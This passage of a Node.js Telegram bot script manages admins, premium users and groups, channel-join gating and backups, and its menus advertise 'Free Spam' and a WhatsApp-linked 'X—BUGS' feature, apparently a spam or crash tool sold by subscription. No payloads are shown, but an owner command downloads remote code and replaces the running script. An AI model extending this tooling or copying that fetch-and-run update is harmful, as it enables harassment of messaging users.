    (id) => Number(id) !== Number(session.targetId)
  );
  saveAdmin(adminList);
  accessSessions.delete(sessionId);
  await ctx.answerCbQuery("✅ Admin dihapus.").catch(() => {});

  await ctx.editMessageText(
    `<b>✅ ADMIN DELETED</b>\n\n` +
    `User <code>${session.targetId}</code> sudah dihapus dari admin.`,
    { parse_mode: "HTML" }
  ).catch(() => {});
});

bot.action(/^access_cancel:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = await getAccessSession(ctx, sessionId);
  if (!session) return;

  accessSessions.delete(sessionId);
  await ctx.answerCbQuery("Dibatalkan.").catch(() => {});
  await ctx.editMessageText(
    "❌ Proses akses dibatalkan.",
    { parse_mode: "HTML" }
  ).catch(() => {});
});

bot.on("text", async (ctx, next) => {
  const pending = [...accessSessions.entries()].find(
    ([, session]) =>
      session.ownerId === String(ctx.from?.id) &&
      session.state === "waiting_days"
  );

  if (!pending) return next();

  const [sessionId, session] = pending;
  const days = Number(ctx.message.text.trim());

  if (!Number.isInteger(days) || days < 1) {
    return ctx.replyWithHTML(
      "❌ Jumlah hari tidak valid. Kirim angka bulat, contoh: <code>30</code>."
    );
  }

  const expiryDate = addPremiumUser(session.targetId, days);
  accessSessions.delete(sessionId);

  return ctx.replyWithHTML(
    `<blockquote><b>✅ PREMIUM ADDED</b></blockquote>\n\n` +
    `👤 <b>Target ID</b>\n` +
    `<code>${session.targetId}</code>\n\n` +
    `📅 Durasi: <b>${days} hari</b>\n` +
    `⏳ Expired: <code>${expiryDate}</code>`
  );
});

// ============ COMMAND /addpremgb ============
bot.command('addpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1).filter(Boolean);
    const groupId = normalizeGroupId(args[0] || (ctx.chat?.type === 'group' || ctx.chat?.type === 'supergroup' ? ctx.chat.id : null));
    const duration = parseInt(args[0] && groupId === normalizeGroupId(args[0]) ? args[1] : args[0], 10);
    const result = addPremiumGroup(groupId, duration, ctx.from.id);
    return ctx.reply(result.success ? `✅ ${result.message}` : `❌ ${result.message}`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.command('delpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1).filter(Boolean);
    const groupId = normalizeGroupId(args[0] || (ctx.chat?.type === 'group' || ctx.chat?.type === 'supergroup' ? ctx.chat.id : null));
    const result = deletePremiumGroup(groupId);
    return ctx.reply(result.success ? `✅ ${result.message}` : `❌ ${result.message}`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

const delay = ms => new Promise(res => setTimeout(res, ms));
const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

//AUTO — UPDATE
bot.command("pullupdate", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Fitur ini hanya dapat digunakan oleh owner.");
  }

  const updateThumbnailUrl = "https://files.catbox.moe/uentjw.png";
  await ctx.replyWithPhoto(
    updateThumbnailUrl,
    { caption: "⏳ Mengunduh dan memvalidasi update terbaru..." }
  );
  try {
    await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);
    const stat = fs.statSync(UPDATE_TEMP_PATH);
    if (stat.size < 100) throw new Error("FILE_UPDATE_KOSONG_ATAU_TIDAK_VALID");

    const syntaxCheck = spawnSync(process.execPath, ["--check", UPDATE_TEMP_PATH], { encoding: "utf8" });
    if (syntaxCheck.status !== 0) {
      throw new Error(`SYNTAX_UPDATE_INVALID: ${String(syntaxCheck.stderr || "").trim()}`);
    }

    fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
    fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);
    await ctx.reply("UPDATE BERHASIL [ VALID ]");
    setTimeout(() => process.exit(0), 2000);
  } catch (error) {
    fs.rmSync(UPDATE_TEMP_PATH, { force: true });
    console.error("[ UPDATE GAGAL ]:", error);
    await ctx.reply(`UPDATE GAGAL [ INVALID ]`);

  }
});

//============ JOIN CHANNEL =======\\
const joinedUsers = new Set();
const antiCulikFile = path.join(__dirname, "database", "anticulik.json");
const allowedGroupsFile = path.join(__dirname, "database", "allowedGroups.json");

function readJsonFile(file, fallback) {
    try {
        return JSON.parse(fs.readFileSync(file, "utf8"));
    } catch (_) {
        return fallback;
    }
}

let antiCulikEnabled = Boolean(readJsonFile(antiCulikFile, { enabled: false }).enabled);
let allowedGroupIds = new Set(
    (readJsonFile(allowedGroupsFile, []) || [])
        .map(value => String(value).trim())
        .filter(value => /^-\d+$/.test(value))
);

function saveAntiCulik() {
    fs.mkdirSync(path.dirname(antiCulikFile), { recursive: true });
    fs.writeFileSync(antiCulikFile, JSON.stringify({ enabled: antiCulikEnabled }, null, 2));
}

function saveAllowedGroups() {
    fs.mkdirSync(path.dirname(allowedGroupsFile), { recursive: true });
    fs.writeFileSync(allowedGroupsFile, JSON.stringify([...allowedGroupIds], null, 2));
}

function isGroupChat(ctx) {
    return ctx.chat?.type === "group" || ctx.chat?.type === "supergroup";
}

function isAntiCulikBlocked(ctx) {
    return antiCulikEnabled &&
        isGroupChat(ctx) &&
        !allowedGroupIds.has(String(ctx.chat.id)) &&
        String(ctx.from?.id) !== String(ownerID);
}

bot.command("anticulik", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const mode = ctx.message.text.split(" ")[1]?.toLowerCase();
    if (!["on", "off"].includes(mode)) {
        return ctx.reply("❌ Format: /anticulik on atau /anticulik off");
    }
    antiCulikEnabled = mode === "on";
    saveAntiCulik();
    return ctx.reply(antiCulikEnabled
        ? "✅ Anti-culik ON. Group yang belum di-whitelist tidak dapat menggunakan menu bot."
        : "✅ Anti-culik OFF. Bot dapat menerima menu dari group mana pun.");
});

bot.command("addgroup", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const groupId = String(ctx.message.text.split(" ")[1] || "").trim();
    if (!/^-\d+$/.test(groupId)) return ctx.reply("❌ Format: /addgroup -1001234567890");
    allowedGroupIds.add(groupId);
    saveAllowedGroups();
    return ctx.reply(`✅ Group <code>${groupId}</code> berhasil masuk whitelist anti-culik.`, { parse_mode: "HTML" });
});

bot.command("delgroup", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const groupId = String(ctx.message.text.split(" ")[1] || "").trim();
    if (!/^-\d+$/.test(groupId)) return ctx.reply("❌ Format: /delgroup -1001234567890");
    allowedGroupIds.delete(groupId);
    saveAllowedGroups();
    return ctx.reply(`✅ Group <code>${groupId}</code> dihapus dari whitelist anti-culik.`, { parse_mode: "HTML" });
});
const channelFile = path.join(__dirname, "database", "channels.json");

function normalizeChannelName(value) {
    if (!value) return null;
    const name = String(value).trim().replace(/^@/, "").replace(/^https?:\/\/(www\.)?t\.me\//i, "").replace(/\/$/, "");
    return /^[A-Za-z0-9_]{5,32}$/.test(name) ? name : null;
}

function loadChannels() {
    try {
        const data = JSON.parse(fs.readFileSync(channelFile, "utf8"));
        const list = Array.isArray(data) ? data : data.channels;
        if (Array.isArray(list)) {
            const valid = [...new Set(list.map(normalizeChannelName).filter(Boolean))].slice(0, 3);
            if (valid.length) return valid;
        }
    } catch (_) {}
    const fallback = normalizeChannelName(CHANNEL_USERNAME);
    return fallback ? [fallback] : [];
}

let channelList = loadChannels();

function saveChannels() {
    fs.mkdirSync(path.dirname(channelFile), { recursive: true });
    fs.writeFileSync(channelFile, JSON.stringify(channelList, null, 2));
}

function channelButtons() {
    return channelList.map((channel, index) => ([{
        text: `「 ${channel} 」`,
        url: `https://t.me/${channel}`,
        style: "success"
    }]));
}

bot.command("addchannel", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const channel = normalizeChannelName(ctx.message.text.split(" ").slice(1).join(" "));
    if (!channel) return ctx.reply("❌ Format: /addchannel username_channel");
    if (channelList.includes(channel)) return ctx.reply("⚠️ Channel tersebut sudah ada.");
    if (channelList.length >= 3) return ctx.reply("❌ Maksimal hanya 3 channel.");
    channelList.push(channel);
    saveChannels();
    return ctx.reply(`✅ Channel @${channel} berhasil ditambahkan.`);
});

bot.command("delchannel", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const channel = normalizeChannelName(ctx.message.text.split(" ").slice(1).join(" "));
    if (!channel) return ctx.reply("❌ Format: /delchannel username_channel");
    if (!channelList.includes(channel)) return ctx.reply("❌ Channel tersebut tidak ada di daftar.");
    if (channelList.length === 1) return ctx.reply("❌ Minimal harus ada 1 channel request.");
    channelList = channelList.filter(item => item !== channel);
    saveChannels();
    return ctx.reply(`✅ Channel @${channel} berhasil dihapus dari request join.`);
});

bot.command("multichannel", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    const channels = [...new Set(input.split(",").map(normalizeChannelName).filter(Boolean))];
    if (channels.length < 1 || channels.length > 3 || channels.length !== input.split(",").filter(Boolean).length) {
        return ctx.reply("❌ Format: /multichannel channel_one,channel_two,channel_three\nMaksimal 3 channel.");
    }
    channelList = channels;
    saveChannels();
    return ctx.reply(`✅ ${channelList.length} channel berhasil disimpan untuk request join.`);
});

bot.command("listchannelaktif", async ctx => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");
    if (!channelList.length) {
        return ctx.reply("⚠️ Belum ada channel aktif untuk request join.");
    }

    const list = channelList
        .map((channel, index) => `${index + 1}. @${channel}`)
        .join("\n");

    return ctx.replyWithHTML(
        `<b>📋 CHANNEL REQUEST JOIN AKTIF</b>\n\n${list}\n\n` +
        `Total: <b>${channelList.length}/3</b> channel`
    );
});

function addJoinedUser(userId, username = null, firstName = null) {
    if (joinedUsers.has(userId)) return false;

    joinedUsers.add(userId);
    return true;
}

function isUserJoined(userId) {
    return joinedUsers.has(userId);
}

async function checkJoin(ctx) {
    try {
        const userId = ctx.from.id;
        if (!channelList.length) return true;
        const results = await Promise.all(channelList.map(async channel => {
            const member = await ctx.telegram.getChatMember(`@${channel}`, userId);
            return ["member", "administrator", "creator"].includes(member.status);
        }));
        const status = results.every(Boolean);
        if (status) {
            addJoinedUser(userId);
        }
        return status;
    } catch (err) {
        console.log("CHECK JOIN ERROR:", err.message);
        return false;
    }
}

async function refreshJoin(ctx) {
    try {
        const userId = ctx.from.id;
        joinedUsers.delete(userId);
        if (!channelList.length) return true;
        const results = await Promise.all(channelList.map(async channel => {
            const member = await ctx.telegram.getChatMember(`@${channel}`, userId);
            return ["member", "administrator", "creator"].includes(member.status);
        }));
        const status = results.every(Boolean);
        if (status) {
            addJoinedUser(userId);
        }
        return status;
    } catch (err) {
        console.log("REFRESH JOIN ERROR:", err.message);
        return false;
    }
}

const notifiedUsers = new Map();

bot.use(async (ctx, next) => {
    if (isAntiCulikBlocked(ctx)) {
        if (ctx.message?.text?.startsWith("/")) {
            return ctx.reply("❌ Bot sedang dalam mode anti-culik. Group ini belum diizinkan owner.");
        }
        return;
    }
    return next();
});

bot.use(async (ctx, next) => {
    try {
        if (!ctx.from) return next();

        const text = ctx.message?.text;
        if (!text) return next();

        if (!text.startsWith("/")) return next();

        const userId = ctx.from.id;
        const joined = await checkJoin(ctx);

        if (!joined) {
            const lastNotif = notifiedUsers.get(userId);
            if (lastNotif && Date.now() - lastNotif < 30000) {
                return;
            }

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: `<blockquote><strong>( <tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> ) Kamu wajib join channel dulu sebelum menggunakan bot ini.</strong></blockquote>`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        ...channelButtons(),
                        [
                            {
                                text: "「  Check Join  」",
                                callback_data: "check_join",
                                style: "primary"
                            }
                        ]
                    ],
                }
            });

            notifiedUsers.set(userId, Date.now());
            setTimeout(() => {
                notifiedUsers.delete(userId);
            }, 300000);

            return;
        }

        if (notifiedUsers.has(userId)) {
            notifiedUsers.delete(userId);
        }

        return next();
    } catch (e) {
        console.log("MIDDLEWARE JOIN ERROR:", e.message);
        return ctx.replyWithPhoto(thumbnailUrl, {
            caption: "❌ Terjadi error saat cek akses channel."
        });
    }
});

bot.action('check_join', async (ctx) => {
    try {
        await ctx.answerCbQuery('⏳ Mengecek...').catch(() => {});

        const userId = ctx.from.id;
        const joined = await refreshJoin(ctx);

        if (joined) {
            if (notifiedUsers.has(userId)) {
                notifiedUsers.delete(userId);
            }

            await ctx.deleteMessage();

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: '<blockquote><tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji>𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗜𝗕𝗘𝗥𝗜𝗞𝗔𝗡!</blockquote>\nKamu sudah join channel. Sekarang kamu bisa menggunakan semua perintah bot.\n\nKetik /start untuk memulai.',
                parse_mode: 'HTML'
            });
        } else {
            await ctx.answerCbQuery('<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Kamu belum join channel! Silakan join dulu.', { show_alert: true });
        }
    } catch (e) {
        console.log("CHECK JOIN CALLBACK ERROR:", e.message);
        try {
            await ctx.answerCbQuery('<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Terjadi error, coba lagi nanti.');
        } catch (err) {}
    }
});

bot.command("listadmin", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  if (!adminList.length) {
    return ctx.reply("📋 Belum ada admin yang terdaftar.");
  }

  const list = adminList
    .map((id, index) => `${index + 1}. <code>${id}</code>`)
    .join("\n");

  return ctx.replyWithHTML(`<b>📋 ADMIN LIST</b>\n\n${list}`);
});

bot.command("listpremium", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  const users = loadPremiumUsers();
  const activeUsers = Object.entries(users).filter(([userId]) => isPremiumUser(userId));

  if (!activeUsers.length) {
    return ctx.reply("📋 Belum ada user premium yang aktif.");
  }

  const list = activeUsers
    .map(([userId, expiry], index) => `${index + 1}. <code>${userId}</code>\n   Expired: <code>${expiry}</code>`)
    .join("\n\n");

  return ctx.replyWithHTML(`<b>📋 PREMIUM USERS</b>\n\n${list}`);
});

bot.command("listpremiumgb", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  const groups = getAllPremiumGroups();
  if (!groups.length) {
    return ctx.reply("📋 Belum ada group premium yang aktif.");
  }

  const list = groups
    .map((group, index) => {
      const expired = new Date(group.expiredAt).toLocaleDateString("id-ID");
      return `${index + 1}. <code>${group.groupId}</code>\n   Expired: <code>${expired}</code>`;
    })
    .join("\n\n");

  return ctx.replyWithHTML(`<b>📋 PREMIUM GROUPS</b>\n\n${list}`);
});

bot.command("listgroup", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  const whitelist = [...allowedGroupIds];
  const premium = getAllPremiumGroups().map(group => group.groupId);
  const allGroups = [...new Set([...whitelist, ...premium])];

  if (!allGroups.length) {
    return ctx.reply("📋 Belum ada group whitelist atau premium.");
  }

  const list = allGroups
    .map((groupId, index) => {
      const labels = [];
      if (allowedGroupIds.has(groupId)) labels.push("WHITELIST");
      if (premium.includes(groupId)) labels.push("PREMIUM");
      return `${index + 1}. <code>${groupId}</code> — ${labels.join(" / ")}`;
    })
    .join("\n");

  return ctx.replyWithHTML(`<b>📋 REGISTERED GROUPS</b>\n\n${list}`);
});

bot.command("statusbot", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  const senderStatus = isWhatsAppConnected ? "Connected" : "Disconnected";
  const antiCulikStatus = antiCulikEnabled ? "ON" : "OFF";
  const premiumGroups = getAllPremiumGroups().length;

  return ctx.replyWithHTML(
    `<b>📊 BOT STATUS</b>\n\n` +
    `Runtime: <code>${formatRuntime()}</code>\n` +
    `Memory: <code>${formatMemory()}</code>\n` +
    `WhatsApp: <b>${senderStatus}</b>\n` +
    `Join Channels: <b>${channelList.length}/3</b>\n` +
    `Premium Groups: <b>${premiumGroups}</b>\n` +
    `Anti-Culik: <b>${antiCulikStatus}</b>`
  );
});

bot.command("backupdata", async ctx => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk owner.");

  const backupPath = path.join(os.tmpdir(), `salvador-database-${Date.now()}.zip`);
  const databasePath = path.join(__dirname, "database");
  const result = spawnSync("zip", ["-qr", backupPath, "."], {
    cwd: databasePath,
    encoding: "utf8"
  });

  if (result.status !== 0 || !fs.existsSync(backupPath)) {
    return ctx.reply("❌ Backup database gagal dibuat.");
  }

  try {
    await ctx.replyWithDocument({ source: backupPath }, {
      caption: "✅ Backup database berhasil dibuat."
    });
  } finally {
    fs.rmSync(backupPath, { force: true });
  }
});

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});

const userFirstStart = new Set();

bot.start(async ctx => {
  if (isAntiCulikBlocked(ctx)) {
    return ctx.reply("❌ Bot sedang dalam mode anti-culik. Group ini belum diizinkan owner.");
  }
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);

    const progressMsg = await ctx.reply('<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> Loading Script...', {
        parse_mode: "HTML",
    });

    const steps = [
        { text: '<tg-emoji emoji-id="6206446249181189526">✨</tg-emoji> 𝖢𝗁𝖾𝖼𝗄𝗂𝗇𝗀 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇...', delay: 800 },
        { text: '<tg-emoji emoji-id="5463345378587849154">✨</tg-emoji> 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆...', delay: 600 },
        { text: '<tg-emoji emoji-id="5307843983102204243">✨</tg-emoji> 𝖵𝖺𝗅𝗂𝖽𝖺𝗍𝗂𝗇𝗀 𝖳𝗈𝗄𝖾𝗇 𝖡𝗈𝗍𝗌...', delay: 800 },
        { text: '<tg-emoji emoji-id="6206479140040743133">✨</tg-emoji> 𝖳𝗈𝗄𝖾𝗇 𝖡𝗈𝗍 𝖵𝖺𝗅𝗂𝖽!', delay: 500 },
        { text: '<tg-emoji emoji-id="6206343625232619150">✨</tg-emoji> 𝖫𝗈𝖺𝖽𝗂𝗇𝗀 𝖣𝖺𝗍𝖺...', delay: 700 },
        { text: '<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> 𝖫𝗈𝖺𝖽𝗂𝗇𝗀 𝖬𝖾𝗇𝗎...', delay: 500 },
    ];

    for (const step of steps) {
        await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            null,
            step.text,
            { parse_mode: "HTML" }
        );
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }

    await ctx.deleteMessage(progressMsg.message_id);
}

    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const senderStatus = isWhatsAppConnected
  ? '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Connected'
  : '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Disconnected';

    const menuMessage = `
<blockquote><strong><tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> 𝗦 𝗔 𝗟 𝗩 𝗔 𝗗 𝗢 𝗥 <tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung
<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 2.0 [ New Updated ]
<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam
<tg-emoji emoji-id="5370577035636786019">📱</tg-emoji> Language : Javascript / Node.Js
<blockquote><strong><tg-emoji emoji-id="5282843764451195532">🖥</tg-emoji> 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> ID : ${userId}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Username : ${username}
<blockquote><strong><tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Connection : ${senderStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Runtime : ${runtimeStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Memory : ${memoryStatus}
`;

  const menuColors = getMenuColors();
  const keyboard = [
    [
      {
        text: "「 𝖷—𝖡𝖴𝖦𝖲 」",
        callback_data: "/bug",
        style: menuColors.bugs,
        icon_custom_emoji_id:'5987813726412083870'
      },
      {
        text: "「 𝖢𝖮𝖭𝖳𝖱𝖮𝖫S 」",
        callback_data: "/controls",
        style: menuColors.controls,
        icon_custom_emoji_id:'5341715473882955310'
      },
    ],
    [
      {
        text: "「 𝖢𝖱𝖤𝖠𝖳𝖮𝖱 」",
        url: "https://t.me/parkyoujoung",
        style: menuColors.creator,
        icon_custom_emoji_id:'5217822164362739968'
      },
      {
        text: "「 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 」",
        url: "https://t.me/Salvadorinformation",
        style: menuColors.information,
        icon_custom_emoji_id:'5282843764451195532'
      },
    ],
  ];

  ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard,
    },
  });
});

bot.action("/start", async ctx => {
    try { await ctx.answerCbQuery(); } catch (error) {}
    if (isAntiCulikBlocked(ctx)) {
      return ctx.reply("❌ Bot sedang dalam mode anti-culik. Group ini belum diizinkan owner.");
    }
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const senderStatus = isWhatsAppConnected
  ? '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Connected'
  : '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Disconnected';

    const menuMessage = `
<blockquote><strong><tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> 𝗦 𝗔 𝗟 𝗩 𝗔 𝗗 𝗢 𝗥 <tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung
<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 2.0 [ New Updated ]
<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam
<tg-emoji emoji-id="5370577035636786019">📱</tg-emoji> Language : Javascript / Node.Js
<blockquote><strong><tg-emoji emoji-id="5282843764451195532">🖥</tg-emoji> 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> ID : ${userId}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Username : ${username}
<blockquote><strong><tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Connection : ${senderStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Runtime : ${runtimeStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Memory : ${memoryStatus}
`;

  const menuColors = getMenuColors();
  const keyboard = [
    [
      {
        text: "「  𝖷—𝖡𝖴𝖦𝖲  」",
        callback_data: "/bug",
        style: menuColors.bugs,
        icon_custom_emoji_id:'5987813726412083870'
      },
      {
        text: "「 𝖢𝖮𝖭𝖳𝖱𝖮𝖫S 」",
        callback_data: "/controls",
        style: menuColors.controls,
        icon_custom_emoji_id:'5341715473882955310'
      },
    ],
    [
      {
        text: "「 𝖢𝖱𝖤𝖠𝖳𝖮𝖱 」",
        url: "https://t.me/parkyoujoung",
        style: menuColors.creator,
        icon_custom_emoji_id:'5217822164362739968'
      },
      {
        text: "「 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 」",
        url: "https://t.me/Salvadorinformation",
        style: menuColors.information,
        icon_custom_emoji_id:'5282843764451195532'
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: keyboard,
        },
      }
    );
  } catch (error) {
    console.error("[CONTROLS CALLBACK ERROR]", error?.response?.description || error?.message || error);
    try {
      await ctx.answerCbQuery("Controls gagal dimuat", { show_alert: true });
    } catch (callbackError) {}
  }
});

function controlHeader(title, ctx) {
  const userId = ctx.from.id;
  const username = ctx.from.username || ctx.from.first_name || "Tidak Diketahui";
  const senderStatus = isWhatsAppConnected
    ? '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Connected'
    : '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Disconnected';

  return `<blockquote><strong><tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> 𝗦 𝗔 𝗟 𝗩 𝗔 𝗗 𝗢 𝗥</strong></blockquote>\n` +
    `<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung\n` +
    `<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram\n` +
    `<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 2.0\n` +
    `<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam\n` +
    `<tg-emoji emoji-id="5370577035636786019">📱</tg-emoji> Language : Javascript / Node.Js\n` +
    `<blockquote><strong><tg-emoji emoji-id="5282843764451195532">🖥</tg-emoji> INFORMATION</strong></blockquote>\n` +
    `<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> ID : ${userId}\n` +
    `<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Username : ${username}\n` +
    `<blockquote><strong><tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji> STATUS</strong></blockquote>\n` +
    `<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Connection : ${senderStatus}\n` +
    `<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Runtime : ${formatRuntime()}\n` +
    `<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Memory : ${formatMemory()}\n\n` +
    `<blockquote><strong>${title}</strong></blockquote>`;
}

function controlButton(text, callback_data, style, icon_custom_emoji_id) {
  return { text, callback_data, style, icon_custom_emoji_id };
}

async function renderControlPage(ctx, title, body, keyboard) {
  if (isAntiCulikBlocked(ctx)) {
    try {
      await ctx.answerCbQuery("Group ini belum diizinkan owner", { show_alert: true });
    } catch (error) {}
    return;
  }
  try {
    await ctx.editMessageCaption(`${controlHeader(title, ctx)}\n${body}`, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
  } catch (error) {
    console.error("[CONTROL PAGE ERROR]", error?.response?.description || error?.message || error);
    try {
      await ctx.answerCbQuery("Menu gagal dimuat", { show_alert: true });
    } catch (callbackError) {}
  }
}

bot.action("/controls", async ctx => {
  try { await ctx.answerCbQuery(); } catch (error) {}
  const body = "Pilih management yang ingin dibuka.";
  const keyboard = [
    [
      controlButton("「 𝖠𝖢𝖢𝖤𝖲𝖲 」", "controls_access", "success", "6206118633370818254"),
      controlButton("「 𝖢𝖧𝖠𝖭𝖭𝖤𝖫 」", "controls_channel", "success", "5271604874419647061")
    ],
    [
      controlButton("「 𝖦𝖱𝖮𝖴𝖯 」", "controls_group", "success", "6028551194861899805"),
      controlButton("「 𝖡𝖮𝖳 」", "controls_bot", "success", "5341715473882955310")
    ],
    [controlButton("「 𝖡𝖠𝖢𝖪 」", "/start", "danger", "5395695537687123235")]
  ];
  await renderControlPage(ctx, "CONTROL CENTER", body, keyboard);
});

bot.action("controls_access", async ctx => {
  try { await ctx.answerCbQuery(); } catch (error) {}
  const body = "‎↯ /addaccess - Add Premium or Admin\n‎↯ /delaccess - Delete Premium or Admin\n‎↯ /listadmin - List Admin\n‎↯ /listpremium - List Premium User";
  const keyboard = [
    [controlButton("「 𝖡𝖠𝖢𝖪 」", "/controls", "danger", "5395695537687123235"), controlButton("「 𝖭𝖤𝖷𝖳 」", "controls_channel", "success", "5416117059207572332")]
  ];
  await renderControlPage(ctx, "ACCESS MANAGEMENT", body, keyboard);
});

bot.action("controls_channel", async ctx => {
  try { await ctx.answerCbQuery(); } catch (error) {}
  const body = "‎↯ /addchannel - Add Join Channel\n‎↯ /delchannel - Delete Join Channel\n‎↯ /multichannel - Set 1-3 Join Channels\n‎↯ /listchannelaktif - List Active Join Channels";
  const keyboard = [
    [controlButton("「 𝖡𝖠𝖢𝖪 」", "/controls", "danger", "5395695537687123235"), controlButton("「 𝖭𝖤𝖷𝖳 」", "controls_group", "success", "5416117059207572332")]
  ];
  await renderControlPage(ctx, "CHANNEL MANAGEMENT", body, keyboard);
});

